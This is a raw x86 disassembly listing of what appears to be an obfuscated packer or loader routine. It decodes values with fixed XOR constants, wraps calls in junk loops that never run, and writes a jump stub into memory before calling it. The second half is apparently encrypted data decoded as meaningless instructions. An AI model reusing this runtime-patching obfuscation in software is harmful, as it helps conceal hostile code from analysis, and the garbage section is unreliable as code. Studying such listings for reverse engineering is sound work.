  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d51
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d65
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d65
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     bl,BYTE PTR [ebx+0x43]
  417973:	push   es
  417974:	(bad)  
  417975:	test   BYTE PTR [eax-0x63178486],bh
  41797b:	jnp    0x4179f8
  41797d:	div    DWORD PTR [ebx]
  41797f:	or     ah,BYTE PTR [edi]
  417981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417982:	adc    esp,ecx
  417984:	enter  0xd62c,0xcc
  417988:	clc    
  417989:	icebp  
  41798a:	xchg   esp,eax
  41798b:	xchg   esp,eax
  41798c:	test   DWORD PTR [ecx+edi*1+0x18cfb21],0xcc3c0ee9
  417997:	and    edx,eax
  417999:	ficomp WORD PTR ds:0x198c2551
  41799f:	(bad)  
  4179a0:	jecxz  0x417a0c
  4179a2:	popa   
  4179a3:	test   BYTE PTR [ebp-0xa3508b5],ch
  4179a9:	jae    0x41797b
  4179ab:	adc    BYTE PTR [ebx+0x40],bl
  4179ae:	adc    DWORD PTR [ecx],esp
  4179b0:	shr    DWORD PTR [edi+0x36],cl
  4179b3:	or     DWORD PTR [ebx+0x2a1a70cc],ecx
  4179b9:	jb     0x417a20
  4179bb:	rcr    BYTE PTR [ecx-0x1ed36cf7],1
  4179c1:	retf   0xd018
  4179c4:	xchg   ebx,eax
  4179c5:	mov    edi,ebp
  4179c7:	cmp    dh,BYTE PTR [ebx+0x7]
  4179ca:	xor    DWORD PTR [ebp+ecx*8-0x6f],eax
  4179ce:	mov    WORD PTR [ebp-0x34],gs
  4179d1:	xor    ch,0xbd
  4179d4:	xchg   edx,eax
  4179d5:	iret   
  4179d6:	jmp    FWORD PTR [edx+eiz*4-0x7b50db77]
  4179dd:	jno    0x4179e7
  4179df:	retf   0xa643
  4179e2:	cmp    al,0xe4
  4179e4:	out    dx,al
  4179e5:	loope  0x417990
  4179e7:	lahf   
  4179e8:	mov    ds:0x32ce2180,al
  4179ed:	adc    ah,ah
  4179ef:	test   BYTE PTR [ebx+ebx*2+0x63],0x51
  4179f4:	adc    DWORD PTR [ebp+0x25],esp
  4179f7:	push   ebp
  4179f8:	xor    al,0x8d
  4179fa:	aad    0x7a
  4179fc:	stc    
  4179fd:	jl     0x417a70
  4179ff:	xchg   edi,eax
  417a00:	jl     0x417a05
  417a02:	enter  0x2b7d,0x8a
  417a06:	mov    DWORD PTR [eax+0x3],ecx
  417a09:	xor    BYTE PTR [eax],dh
  417a0b:	stos   DWORD PTR es:[edi],eax
  417a0c:	pop    ecx
  417a0d:	stos   BYTE PTR es:[edi],al
  417a0e:	or     DWORD PTR [esp+eax*4+0x433d2485],ebp
  417a15:	cmc    
  417a16:	cdq    
  417a17:	sbb    DWORD PTR [eax-0x4fa1e420],edx
  417a1d:	pop    ebx
  417a1e:	lds    esp,FWORD PTR [esi+0x6b]
  417a21:	pop    ebx
  417a22:	and    esi,edi
  417a24:	ret    0x59e
  417a27:	xor    DWORD PTR [edx],0xa9d2cf3a
  417a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a2e:	add    eax,0x992cba8
  417a33:	mov    ecx,0xf0b7ad8c
  417a38:	mov    ds:0x8dadc402,al
  417a3d:	cmc    
  417a3e:	arpl   bx,si
  417a40:	or     dl,BYTE PTR [ebx-0x13]
  417a43:	add    al,0x2f
  417a45:	rcr    ecx,cl
  417a47:	jge    0x417a88
  417a49:	aad    0x65
  417a4b:	or     DWORD PTR ds:0x19e78891,ecx
  417a51:	retf   0xc45d
  417a54:	int3   
  417a55:	ins    BYTE PTR es:[edi],dx
  417a56:	ins    BYTE PTR es:[edi],dx
  417a57:	mov    DWORD PTR [ebp-0xd7cfee6],esi
  417a5d:	jns    0x417a61
  417a5f:	mov    ah,0xe8
  417a61:	xchg   ebp,eax
  417a62:	imul   esi,DWORD PTR [esi],0x4651baa7
  417a68:	pop    ss
  417a69:	xchg   esi,eax
  417a6a:	fstp   DWORD PTR [eax-0x39]
  417a6d:	dec    edi
  417a6e:	das    
  417a6f:	mov    bh,0x23
  417a71:	aas    
  417a72:	dec    edi
  417a73:	mov    cl,0x7
  417a75:	xchg   edx,eax
  417a76:	cdq    
  417a77:	xor    ecx,eax
  417a79:	push   ss
  417a7a:	aam    0x4
  417a7c:	in     eax,dx
  417a7d:	and    ecx,DWORD PTR [edx+0x72a7faa3]
  417a83:	sar    DWORD PTR [eax+0x69],1
  417a86:	sub    cl,ch
  417a88:	mov    ecx,0x5eb3851d
  417a8d:	std    
  417a8e:	add    al,0x77
  417a90:	dec    esp
  417a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a92:	jo     0x417b0d
  417a94:	ins    DWORD PTR es:[edi],dx
  417a95:	popa   
  417a96:	inc    ebp
  417a97:	mov    esi,0x39e48b82
  417a9c:	(bad)  
  417a9d:	mov    edx,DWORD PTR [ebx-0x51279cfe]
  417aa3:	mov    eax,ds:0x7078e574
  417aa8:	es mov ebx,0x51267476
  417aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aaf:	retf   0x8614
  417ab2:	enter  0xade9,0x34
  417ab6:	and    cl,BYTE PTR [ebp-0x39]
  417ab9:	mov    ds:0xd7722b7a,eax
  417abe:	sbb    ah,bh
  417ac0:	push   ebp
  417ac1:	in     eax,0x16
  417ac3:	pop    edi
  417ac4:	and    BYTE PTR [esi-0x43],dh
  417ac7:	loop   0x417b09
  417ac9:	test   DWORD PTR [esp+esi*8],ebx
  417acc:	bound  ebp,QWORD PTR [eax+0x20]
  417acf:	shl    BYTE PTR cs:[ebp+0x46],0x87
  417ad4:	jo     0x417a98
  417ad6:	cmp    cl,BYTE PTR [ecx]
  417ad8:	push   cs
  417ad9:	in     eax,dx
  417ada:	cmp    DWORD PTR [esi+ebp*1],edx
  417add:	push   cs
  417ade:	push   ds
  417adf:	imul   ebp,DWORD PTR [ecx+0xd43c308],0xffffffe1
  417ae6:	ror    dh,0x1d
  417ae9:	test   BYTE PTR [eax],0xfa
  417aec:	arpl   WORD PTR fs:[edi],dx
  417aef:	and    al,0xaa
  417af1:	dec    esi
  417af2:	lods   eax,DWORD PTR ds:[esi]
  417af3:	stos   BYTE PTR es:[edi],al
  417af4:	sti    
  417af5:	rcr    BYTE PTR [edi],1
  417af7:	(bad)  
  417af8:	lock cdq 
  417afa:	std    
  417afb:	inc    edi
  417afc:	imul   DWORD PTR ds:0xfdd8f706
  417b02:	lods   al,BYTE PTR ds:[esi]
  417b03:	xlat   BYTE PTR ds:[ebx]
  417b04:	test   al,0x4a
  417b06:	es xor dh,cl
  417b09:	ds repz mov ah,0xf2
  417b0d:	sbb    BYTE PTR [esi-0x73651d4b],0x92
  417b14:	imul   ecx,DWORD PTR [edi+0x9],0x78
  417b18:	add    edi,DWORD PTR [esi]
  417b1a:	fild   WORD PTR [esi+0x7f41a268]
  417b20:	out    dx,eax
  417b21:	jo     0x417b1e
  417b23:	shl    BYTE PTR [edx+0x301d2572],0x5
  417b2a:	mov    al,0x8c
  417b2c:	loopne 0x417b1a
  417b2e:	in     al,0xf1
  417b30:	mov    dl,0xc1
  417b32:	push   ss
  417b33:	cld    
  417b34:	adc    DWORD PTR [esp+eax*1+0x4b],ebp
  417b38:	fbld   TBYTE PTR [edi-0x49947765]
  417b3e:	xor    al,0xa2
  417b40:	pushf  
  417b41:	push   0xffffffa0
  417b43:	jp     0x417b96
  417b45:	(bad)  
  417b46:	adc    al,0x9
  417b48:	int    0x6d
  417b4a:	cdq    
  417b4b:	xchg   ebx,eax
  417b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b4d:	mov    edi,0x85e7896a
  417b52:	mov    esi,0x4b3b6e78
  417b57:	into   
  417b58:	xchg   esi,eax
  417b59:	xchg   BYTE PTR [ecx-0x7859dc25],bh
  417b5f:	dec    ebp
  417b60:	popa   
  417b61:	adc    bl,BYTE PTR [ecx]
  417b63:	jle    0x417b6f
  417b65:	iret   
  417b66:	mov    ecx,0x673496ae
  417b6b:	(bad)  
  417b6c:	jno    0x417b3c
  417b6e:	bound  edx,QWORD PTR [ebx+eax*4+0x7ff0c23]
  417b75:	cmp    eax,0xae744bae
  417b7a:	enter  0x817e,0x24
  417b7e:	mov    ch,0xc4
  417b80:	sbb    edx,DWORD PTR [eax+0x4f]
  417b83:	out    0x7f,al
  417b85:	adc    cl,bl
  417b87:	xchg   edx,eax
  417b88:	lahf   
  417b89:	js     0x417bcc
  417b8b:	jb     0x417b77
  417b8d:	jge    0x417b20
  417b8f:	xlat   BYTE PTR ds:[ebx]
  417b90:	daa    
  417b91:	sbb    BYTE PTR [ebp-0x51019833],bh
  417b97:	jo     0x417b95
  417b99:	pop    ebx
  417b9a:	jmp    DWORD PTR [esp+edi*4]
  417b9d:	adc    eax,0x8f7264f3
  417ba2:	push   esp
  417ba3:	and    al,0xa8
  417ba5:	data16 out 0x4d,al
  417ba8:	mov    al,ds:0x9a36ce7d
  417bad:	pop    ecx
  417bae:	test   esi,ecx
  417bb0:	nop
  417bb1:	mov    al,0xbd
  417bb3:	frstor [edx]
  417bb5:	aas    
  417bb6:	popf   
  417bb7:	aad    0xe2
  417bb9:	cmp    eax,DWORD PTR [edx-0x4904dfc2]
  417bbf:	test   eax,0x6f2af7a2
  417bc4:	cli    
  417bc5:	push   ss
  417bc6:	stos   BYTE PTR es:[edi],al
  417bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bc8:	mov    eax,0xb20dbb90
  417bcd:	inc    edi
  417bce:	mov    BYTE PTR [ebx+ebx*8],cl
  417bd1:	jmp    0xbe3e:0x732
  417bd7:	jp     0x417b66
  417bd9:	mov    ds:0x144431cc,al
  417bde:	js     0x417b9c
  417be0:	jns    0x417b9d
  417be2:	mov    BYTE PTR [esi],cl
  417be4:	xlat   BYTE PTR ds:[ebx]
  417be5:	(bad)  [eax+0x7]
  417be8:	mov    ebp,0x60e86643
  417bed:	cmp    al,0x21
  417bef:	dec    ebp
  417bf0:	retf   0x5e9b
  417bf3:	sub    BYTE PTR [edi-0x1de2ba9e],cl
  417bf9:	cdq    
  417bfa:	push   eax
  417bfb:	aas    
  417bfc:	mov    ebx,0x2ac60645
  417c01:	loop   0x417c1c
  417c03:	std    
  417c04:	mov    dl,BYTE PTR [ecx+eiz*8-0x58]
  417c08:	xlat   BYTE PTR ds:[ebx]
  417c09:	push   esp
  417c0a:	out    0xc8,al
  417c0c:	push   esi
  417c0d:	lods   al,BYTE PTR ds:[esi]
  417c0e:	dec    ecx
  417c0f:	jne    0x417c14
  417c11:	mov    edi,0x5e2275dc
  417c16:	neg    BYTE PTR [ecx-0x46]
  417c19:	fidiv  DWORD PTR [ebx-0x65]
  417c1c:	ds popa 
  417c1e:	mul    BYTE PTR [ecx]
  417c20:	and    BYTE PTR [edx-0x2135721],0x80
  417c27:	mov    esi,0x44cbe49c
  417c2c:	cmp    ch,BYTE PTR [ebx-0x19f7bb4f]
  417c32:	adc    esi,ebx
  417c34:	ret    0xa41a
  417c37:	adc    DWORD PTR [ebx+edx*4],eax
  417c3a:	out    dx,eax
  417c3b:	popa   
  417c3c:	sbb    eax,0x9ceeefff
  417c41:	fst    DWORD PTR [esi+eiz*8+0x38]
  417c45:	or     DWORD PTR [ecx+0x54e43af7],esp
  417c4b:	fimul  DWORD PTR [ebp-0x7e]
  417c4e:	mov    eax,ds:0x56265aaa
